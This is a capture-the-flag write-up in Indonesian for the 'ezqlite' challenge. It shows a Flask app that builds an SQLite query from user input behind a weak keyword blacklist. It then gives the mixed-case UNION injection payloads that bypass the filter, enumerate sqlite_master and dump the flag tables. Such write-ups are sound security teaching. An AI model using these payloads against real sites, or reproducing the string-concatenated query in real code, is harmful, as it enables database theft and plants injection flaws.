# ezqlite
> It's just a simple website, nothing strange right?
> http://103.167.136.89:10031/
> Author: bleedz#0666 (Discord) / @bl33dz (Tele)

## About the Challenge
Diberikan sebuah website dengan tampilan 
<img width="959" alt="image" src="https://github.com/dotnaonweh/ForestyCTF/assets/49785290/29486a8e-48b7-4070-b21b-bc07048d4290">

Dan juga diberikan code

```python
import json
import sqlite3
from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

@app.route("/", methods=['GET', 'POST'])
def index():
    conn = sqlite3.connect('songs.db')
    cur = conn.cursor()
    data = None
    if request.method == "POST":
        q = filter_words(request.form.get('song'))
        query = "SELECT * FROM songs WHERE title LIKE '%" + q + "%' ORDER BY rank ASC LIMIT 5;"
        try:
            cur.execute(query)
            data = cur.fetchall()
        except:
            data = []
    return render_template('index.html', data=data)

def filter_words(query):
    blacklist = ['--', 'LIKE', 'like', 'ORDER', 'order', 'UNION', 'union', 'SELECT', 'select']
    for word in blacklist:
        query = query.replace(word, "")
    return query
```
    

## How to Solve?
Jika dilihat dari code kita sudah tahu kalau jenis sql apa yang digunakan, dan juga query apa saja yang masuk ke dalam blacklist word.

Filter yang diberikan sebenarnya masih bisa di bypass, contohnya comment -- di blacklist, masih bisa memakai /*, dan untuk query lainnya bisa di bypass dengan cara uNion, oRder, sElect, etc.

<img width="905" alt="image" src="https://github.com/dotnaonweh/ForestyCTF/assets/49785290/7866c7c5-5e34-49b5-beed-d3fb09175359">

Lanjut ke proses inject nya

<img width="905" alt="image" src="https://github.com/dotnaonweh/ForestyCTF/assets/49785290/c4bcd295-2f46-468b-a214-316dd74bcbb8">

Setelah itu coba untuk melihat table apa saja yang ada

```
-i' uNion sElect 1,tbl_name,3 FROM sqlite_master WHERE type='table' and tbl_name NOT likE 'sqlite_%'/*
```
<img width="903" alt="image" src="https://github.com/dotnaonweh/ForestyCTF/assets/49785290/eb553c73-afb5-4605-8a5a-66995c531af2">

Terdapat banyak sekali table flag, selanjutnya cek kolom pada table flag tersebut

```
-i' uNion sElect 1,sql,3 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='flag_1'/*
```

<img width="548" alt="image" src="https://github.com/dotnaonweh/ForestyCTF/assets/49785290/db994be3-64c1-431e-8bbb-a495ec70d592">

Diketahui pada table flag_, yaitu berisi id, dan flag, selanjutnya langsung saja dump kolom flag nya

```
-i' uNion sElect 1,flag,3 FROM flag_1/*
```

<img width="538" alt="image" src="https://github.com/dotnaonweh/ForestyCTF/assets/49785290/3d826ad6-4341-477c-8aa9-7328a5fc28d9">

Ternyata pada table flag_1 hanya terdapat flag palsu, lanjut cek table lain

```
-i' uNion sElect 1,flag,3 FROM flag_3/*
```
<img width="547" alt="image" src="https://github.com/dotnaonweh/ForestyCTF/assets/49785290/940b7416-7b97-4f7d-8716-f4168c719506">

Flag asli didapat pada table flag_3


```
ForestyHC{sqlit3_injectiooooonnn_is_basic_0c3662}	
```
